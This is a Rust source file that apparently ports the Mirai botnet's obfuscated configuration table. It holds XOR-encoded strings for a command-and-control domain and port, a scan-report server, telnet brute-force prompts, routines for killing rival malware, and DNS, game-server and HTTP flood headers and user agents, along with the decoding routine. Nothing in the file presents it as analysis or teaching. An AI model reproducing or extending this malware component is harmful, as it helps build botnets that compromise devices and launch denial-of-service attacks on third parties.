use std::collections::HashMap;
use std::sync::{Arc, Mutex};

// Define the structure for table values
struct TableValue {
    val: Vec<u8>,
    val_len: u16,
    #[cfg(debug_assertions)]
    locked: bool,
}

// Define constants for table keys
const TABLE_PROCESS_ARGV: u8 = 1;
const TABLE_EXEC_SUCCESS: u8 = 2;
const TABLE_CNC_DOMAIN: u8 = 3;
const TABLE_CNC_PORT: u8 = 4;

const TABLE_KILLER_SAFE: u8 = 5;
const TABLE_KILLER_PROC: u8 = 6;
const TABLE_KILLER_EXE: u8 = 7;
const TABLE_KILLER_DELETED: u8 = 8;
const TABLE_KILLER_FD: u8 = 9;
const TABLE_KILLER_ANIME: u8 = 10;
const TABLE_KILLER_STATUS: u8 = 11;
const TABLE_MEM_QBOT: u8 = 12;
const TABLE_MEM_QBOT2: u8 = 13;
const TABLE_MEM_QBOT3: u8 = 14;
const TABLE_MEM_UPX: u8 = 15;
const TABLE_MEM_ZOLLARD: u8 = 16;
const TABLE_MEM_REMAITEN: u8 = 17;

const TABLE_SCAN_CB_DOMAIN: u8 = 18;
const TABLE_SCAN_CB_PORT: u8 = 19;
const TABLE_SCAN_SHELL: u8 = 20;
const TABLE_SCAN_ENABLE: u8 = 21;
const TABLE_SCAN_SYSTEM: u8 = 22;
const TABLE_SCAN_SH: u8 = 23;
const TABLE_SCAN_QUERY: u8 = 24;
const TABLE_SCAN_RESP: u8 = 25;
const TABLE_SCAN_NCORRECT: u8 = 26;
const TABLE_SCAN_PS: u8 = 27;
const TABLE_SCAN_KILL_9: u8 = 28;

const TABLE_ATK_VSE: u8 = 29;
const TABLE_ATK_RESOLVER: u8 = 30;
const TABLE_ATK_NSERV: u8 = 31;

const TABLE_ATK_KEEP_ALIVE: u8 = 32;
const TABLE_ATK_ACCEPT: u8 = 33;
const TABLE_ATK_ACCEPT_LNG: u8 = 34;
const TABLE_ATK_CONTENT_TYPE: u8 = 35;
const TABLE_ATK_SET_COOKIE: u8 = 36;
const TABLE_ATK_REFRESH_HDR: u8 = 37;
const TABLE_ATK_LOCATION_HDR: u8 = 38;
const TABLE_ATK_SET_COOKIE_HDR: u8 = 39;
const TABLE_ATK_CONTENT_LENGTH_HDR: u8 = 40;
const TABLE_ATK_TRANSFER_ENCODING_HDR: u8 = 41;
const TABLE_ATK_CHUNKED: u8 = 42;
const TABLE_ATK_KEEP_ALIVE_HDR: u8 = 43;
const TABLE_ATK_CONNECTION_HDR: u8 = 44;
const TABLE_ATK_DOSARREST: u8 = 45;
const TABLE_ATK_CLOUDFLARE_NGINX: u8 = 46;

const TABLE_HTTP_ONE: u8 = 47;
const TABLE_HTTP_TWO: u8 = 48;
const TABLE_HTTP_THREE: u8 = 49;
const TABLE_HTTP_FOUR: u8 = 50;
const TABLE_HTTP_FIVE: u8 = 51;

const TABLE_MAX_KEYS: usize = 52;

// Define the global table as a thread-safe mutable map
lazy_static::lazy_static! {
    static ref TABLE: Arc<Mutex<HashMap<u8, TableValue>>> = Arc::new(Mutex::new(HashMap::new()));
}

fn table_init() {
    add_entry(TABLE_CNC_DOMAIN, b"\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22".to_vec());
    add_entry(TABLE_CNC_PORT, b"\x22\x35".to_vec());

    add_entry(TABLE_SCAN_CB_DOMAIN, b"\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22".to_vec());
    add_entry(TABLE_SCAN_CB_PORT, b"\x99\xC7".to_vec());

    add_entry(TABLE_EXEC_SUCCESS, b"\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22".to_vec());
    add_entry(TABLE_KILLER_SAFE, b"\x4A\x56\x56\x52\x51\x18\x0D\x0D\x5B\x4D\x57\x56\x57\x0C\x40\x47\x0D\x46\x73\x55\x16\x55\x1B\x75\x45\x7A\x41\x73\x22".to_vec());
    add_entry(TABLE_KILLER_PROC, b"\x0D\x52\x50\x4D\x41\x0D\x22".to_vec());
    add_entry(TABLE_KILLER_EXE, b"\x0D\x47\x5A\x47\x22".to_vec());
    add_entry(TABLE_KILLER_DELETED, b"\x02\x0A\x46\x47\x4E\x47\x56\x47\x46\x0B\x22".to_vec());
    add_entry(TABLE_KILLER_FD, b"\x0D\x44\x46\x22".to_vec());
    add_entry(TABLE_KILLER_ANIME, b"\x0C\x43\x4C\x4B\x4F\x47\x22".to_vec());
    add_entry(TABLE_KILLER_STATUS, b"\x0D\x51\x56\x43\x56\x57\x51\x22".to_vec());
    add_entry(TABLE_MEM_QBOT, b"\x70\x67\x72\x6D\x70\x76\x02\x07\x51\x18\x07\x51\x22".to_vec());
    add_entry(TABLE_MEM_QBOT2, b"\x6A\x76\x76\x72\x64\x6E\x6D\x6D\x66\x22".to_vec());
    add_entry(TABLE_MEM_QBOT3, b"\x6E\x6D\x6E\x6C\x6D\x65\x76\x64\x6D\x22".to_vec());
    add_entry(TABLE_MEM_UPX, b"\x7E\x5A\x17\x1A\x7E\x5A\x16\x66\x7E\x5A\x16\x67\x7E\x5A\x16\x67\x7E\x5A\x16\x11\x7E\x5A\x17\x12\x7E\x5A\x16\x14\x7E\x5A\x10\x10\x22".to_vec());
    add_entry(TABLE_MEM_ZOLLARD, b"\x58\x4D\x4E\x4E\x43\x50\x46\x22".to_vec());
    add_entry(TABLE_MEM_REMAITEN, b"\x65\x67\x76\x6E\x6D\x61\x63\x6E\x6B\x72\x22".to_vec());

    add_entry(TABLE_SCAN_SHELL, b"\x51\x4A\x47\x4E\x4E\x22".to_vec());
    add_entry(TABLE_SCAN_ENABLE, b"\x47\x4C\x43\x40\x4E\x47\x22".to_vec());
    add_entry(TABLE_SCAN_SYSTEM, b"\x51\x5B\x51\x56\x47\x4F\x22".to_vec());
    add_entry(TABLE_SCAN_SH, b"\x51\x4A\x22".to_vec());
    add_entry(TABLE_SCAN_QUERY, b"\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x6F\x6B\x70\x63\x6B\x22".to_vec());
    add_entry(TABLE_SCAN_RESP, b"\x6F\x6B\x70\x63\x6B\x18\x02\x43\x52\x52\x4E\x47\x56\x02\x4C\x4D\x56\x02\x44\x4D\x57\x4C\x46\x22".to_vec());
    add_entry(TABLE_SCAN_NCORRECT, b"\x4C\x41\x4D\x50\x50\x47\x41\x56\x22".to_vec());
    add_entry(TABLE_SCAN_PS, b"\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x52\x51\x22".to_vec());
    add_entry(TABLE_SCAN_KILL_9, b"\x0D\x40\x4B\x4C\x0D\x40\x57\x51\x5B\x40\x4D\x5A\x02\x49\x4B\x4E\x4E\x02\x0F\x1B\x02\x22".to_vec());

    add_entry(TABLE_ATK_VSE, b"\x76\x71\x4D\x57\x50\x41\x47\x02\x67\x4C\x45\x4B\x4C\x47\x02\x73\x57\x47\x50\x5B\x22".to_vec());
    add_entry(TABLE_ATK_RESOLVER, b"\x0D\x47\x56\x41\x0D\x50\x47\x51\x4D\x4E\x54\x0C\x41\x4D\x4C\x44\x22".to_vec());
    add_entry(TABLE_ATK_NSERV, b"\x4C\x43\x4F\x47\x51\x47\x50\x54\x47\x50\x02\x22".to_vec());

    add_entry(TABLE_ATK_KEEP_ALIVE, b"\x61\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x02\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22".to_vec());
    add_entry(TABLE_ATK_ACCEPT, b"\x63\x41\x41\x47\x52\x56\x18\x02\x56\x47\x5A\x56\x0D\x4A\x56\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4A\x56\x4F\x4E\x09\x5A\x4F\x4E\x0E\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x4F\x4E\x19\x53\x1F\x12\x0C\x1B\x0E\x4B\x4F\x43\x45\x47\x0D\x55\x47\x40\x52\x0E\x08\x0D\x08\x19\x53\x1F\x12\x0C\x1A\x22".to_vec());
    add_entry(TABLE_ATK_ACCEPT_LNG, b"\x63\x41\x41\x47\x52\x56\x0F\x6E\x43\x4C\x45\x57\x43\x45\x47\x18\x02\x47\x4C\x0F\x77\x71\x0E\x47\x4C\x19\x53\x1F\x12\x0C\x1A\x22".to_vec());
    add_entry(TABLE_ATK_CONTENT_TYPE, b"\x61\x4D\x4C\x56\x47\x4C\x56\x0F\x76\x5B\x52\x47\x18\x02\x43\x52\x52\x4E\x4B\x41\x43\x56\x4B\x4D\x4C\x0D\x5A\x0F\x55\x55\x55\x0F\x44\x4D\x50\x4F\x0F\x57\x50\x4E\x47\x4C\x41\x4D\x46\x47\x46\x22".to_vec());
    add_entry(TABLE_ATK_SET_COOKIE, b"\x51\x47\x56\x61\x4D\x4D\x49\x4B\x47\x0A\x05\x22".to_vec());
    add_entry(TABLE_ATK_REFRESH_HDR, b"\x50\x47\x44\x50\x47\x51\x4A\x18\x22".to_vec());
    add_entry(TABLE_ATK_LOCATION_HDR, b"\x4E\x4D\x41\x43\x56\x4B\x4D\x4C\x18\x22".to_vec());
    add_entry(TABLE_ATK_SET_COOKIE_HDR, b"\x51\x47\x56\x0F\x41\x4D\x4D\x49\x4B\x47\x18\x22".to_vec());
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, b"\x41\x4D\x4C\x56\x47\x4C\x56\x0F\x4E\x47\x4C\x45\x56\x4A\x18\x22".to_vec());
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, b"\x56\x50\x43\x4C\x51\x44\x47\x50\x0F\x47\x4C\x41\x4D\x46\x4B\x4C\x45\x18\x22".to_vec());
    add_entry(TABLE_ATK_CHUNKED, b"\x41\x4A\x57\x4C\x49\x47\x46\x22".to_vec());
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, b"\x49\x47\x47\x52\x0F\x43\x4E\x4B\x54\x47\x22".to_vec());
    add_entry(TABLE_ATK_CONNECTION_HDR, b"\x41\x4D\x4C\x4C\x47\x41\x56\x4B\x4D\x4C\x18\x22".to_vec());
    add_entry(TABLE_ATK_DOSARREST, b"\x51\x47\x50\x54\x47\x50\x18\x02\x46\x4D\x51\x43\x50\x50\x47\x51\x56\x22".to_vec());
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, b"\x51\x47\x50\x54\x47\x50\x18\x02\x41\x4E\x4D\x57\x46\x44\x4E\x43\x50\x47\x0F\x4C\x45\x4B\x4C\x5A\x22".to_vec());

    add_entry(TABLE_HTTP_ONE, b"\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x13\x0C\x12\x0C\x10\x15\x12\x16\x0C\x13\x12\x11\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22".to_vec());
    add_entry(TABLE_HTTP_TWO, b"\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x13\x12\x0C\x12\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x10\x0C\x12\x0C\x10\x15\x16\x11\x0C\x13\x13\x14\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22".to_vec());
    add_entry(TABLE_HTTP_THREE, b"\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x14\x0C\x13\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x13\x0C\x12\x0C\x10\x15\x12\x16\x0C\x13\x12\x11\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22".to_vec());
    add_entry(TABLE_HTTP_FOUR, b"\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x75\x4B\x4C\x46\x4D\x55\x51\x02\x6C\x76\x02\x14\x0C\x13\x19\x02\x75\x6D\x75\x14\x16\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x17\x11\x15\x0C\x11\x14\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x61\x4A\x50\x4D\x4F\x47\x0D\x17\x10\x0C\x12\x0C\x10\x15\x16\x11\x0C\x13\x13\x14\x02\x71\x43\x44\x43\x50\x4B\x0D\x17\x11\x15\x0C\x11\x14\x22".to_vec());
    add_entry(TABLE_HTTP_FIVE, b"\x6F\x4D\x58\x4B\x4E\x4E\x43\x0D\x17\x0C\x12\x02\x0A\x6F\x43\x41\x4B\x4C\x56\x4D\x51\x4A\x19\x02\x6B\x4C\x56\x47\x4E\x02\x6F\x43\x41\x02\x6D\x71\x02\x7A\x02\x13\x12\x7D\x13\x13\x7D\x14\x0B\x02\x63\x52\x52\x4E\x47\x75\x47\x40\x69\x4B\x56\x0D\x14\x12\x13\x0C\x15\x0C\x15\x02\x0A\x69\x6A\x76\x6F\x6E\x0E\x02\x4E\x4B\x49\x47\x02\x65\x47\x41\x49\x4D\x0B\x02\x74\x47\x50\x51\x4B\x4D\x4C\x0D\x1B\x0C\x13\x0C\x10\x02\x71\x43\x44\x43\x50\x4B\x0D\x14\x12\x13\x0C\x15\x0C\x15\x22".to_vec());
}

fn table_unlock_val(id: u8) {
    let mut table = TABLE.lock().unwrap();
    if let Some(val) = table.get_mut(&id) {
        #[cfg(debug_assertions)]
        {
            if !val.locked {
                eprintln!("[table] Tried to double-unlock value {}", id);
                return;
            }
        }

        toggle_obf(val);
    }
}

fn table_lock_val(id: u8) {
    let mut table = TABLE.lock().unwrap();
    if let Some(val) = table.get_mut(&id) {
        #[cfg(debug_assertions)]
        {
            if val.locked {
                eprintln!("[table] Tried to double-lock value {}", id);
                return;
            }
        }

        toggle_obf(val);
    }
}

fn table_retrieve_val(id: u8, len: Option<&mut usize>) -> Option<Vec<u8>> {
    let table = TABLE.lock().unwrap();
    if let Some(val) = table.get(&id) {
        #[cfg(debug_assertions)]
        {
            if val.locked {
                eprintln!("[table] Tried to access table.{} but it is locked", id);
                return None;
            }
        }

        if let Some(len_ref) = len {
            *len_ref = val.val_len as usize;
        }
        Some(val.val.clone())
    } else {
        None
    }
}

fn add_entry(id: u8, buf: Vec<u8>) {
    let mut table = TABLE.lock().unwrap();
    let cpy = buf.clone();

    table.insert(id, TableValue {
        val: cpy,
        val_len: buf.len() as u16,
        #[cfg(debug_assertions)]
        locked: true,
    });
}

fn toggle_obf(val: &mut TableValue) {
    let k1 = 0xdeu8;
    let k2 = 0xadu8;
    let k3 = 0xbeu8;
    let k4 = 0xefu8;

    for byte in &mut val.val {
        *byte ^= k1;
        *byte ^= k2;
        *byte ^= k3;
        *byte ^= k4;
    }

    #[cfg(debug_assertions)]
    {
        val.locked = !val.locked;
    }
}
